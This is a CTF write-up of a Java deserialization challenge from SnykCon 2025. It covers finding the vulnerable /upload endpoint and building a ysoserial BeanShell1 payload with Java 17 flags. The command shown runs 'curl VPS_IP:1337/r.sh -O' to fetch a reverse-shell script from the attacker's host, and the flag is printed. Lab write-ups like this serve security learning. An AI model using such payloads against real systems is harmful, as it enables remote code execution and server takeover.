# idi0Tic
![image](https://github.com/user-attachments/assets/54c21ff4-d56c-470f-a0f4-15e68ea60f27)

Attachment: [challenge.zip](https://github.com/LazyTitan33/CTF-Writeups/raw/refs/heads/main/SnykCon2025/attachments/idiotic.zip)

## Writeup

From the Dockerfile, I can tell that this application is using Java 17 JDK.  

![image](https://github.com/user-attachments/assets/8c9a0c17-7b25-4399-8f89-e4742882efba)

A simple login page greets me:  

![image](https://github.com/user-attachments/assets/d18c10be-4af5-47fb-9d09-f36524ce23b5)

Going through the provided source code, I can see valid credentials so I can login:  

![image](https://github.com/user-attachments/assets/44559b04-7524-478b-8763-c3546c03393d)

Looking further in the source code, using Visual Studio Code with the [Snyk](https://docs.snyk.io/scm-ide-and-ci-cd-integrations/snyk-ide-plugins-and-extensions/visual-studio-code-extension) extension installed :wink:, it correctly identifies a  High Severity vulnerability due to Deserialization of Untrusted Data.  

![image](https://github.com/user-attachments/assets/9b9fd789-7480-4720-ae09-431d228902aa)

After logging in, I can see an option to Add Device, among other options:  

![image](https://github.com/user-attachments/assets/4323552a-5efe-4023-b758-57c5860e6804)

The /upload endpoint is indeed the one doing the deserialization:  

![image](https://github.com/user-attachments/assets/1529a434-0cbb-4cd9-9b3e-9bd9d2a253b9)

I can also generate a .bin file:  

![image](https://github.com/user-attachments/assets/b64d4123-5030-432e-830c-ac5de01d8c75)

Which is just serialized data:  

![image](https://github.com/user-attachments/assets/83937da1-5958-4d6e-91d8-ddc16042f194)

When adding the device, I can import this .bin file and in Burp, I can see it is uploading it as base64 blob, just like the source code says:  

![image](https://github.com/user-attachments/assets/a22353de-5d39-4657-96e3-88e5093c6791)

Under the Model folder, I can see the `Device.java` code is the only class that implements `Serializable` so this is definitely the endpoint/functionality we need to focus on to exploit the Java Deserialization.  

![image](https://github.com/user-attachments/assets/0d07ccc0-9704-433e-8045-929ef7ce8e46)

> [!IMPORTANT]  
> I spent quite a few hours troubleshooting and trying various methods. It got to be quite annoying as I was sure I was doing the correct thing but I couldn't get RCE. Finally I found [this](https://github.com/frohoff/ysoserial/issues/203) github issue raised on ysoserial having issues with Java 17. There is a lengthy discussion about needing to use specific flags and the arguments need to be in a slightly different order.

I was finally able to get RCE by using this syntax:

```bash

java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED   --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED  -jar ysoserial-all.jar BeanShell1 'curl VPS_IP:1337/r.sh -O'|base64 -w0

```

I'm using BeanShell1 because I noticed beanshell being used as a dependency in pom.xml with the same version mentioned by ysoserial:  

![image](https://github.com/user-attachments/assets/6289fa0d-514a-422a-8461-423efb8e6dd2)

The first generates a base64 payload that when deserialized, uploads a bash reverse shell. Because java can be weird with piping and redirections, I simply run a second command to run the bash reverse shell.

![image](https://github.com/user-attachments/assets/9309db04-1bde-4852-b642-5f5c710863cb)

flag{927868b13a72eef4b4ebd186140af680}

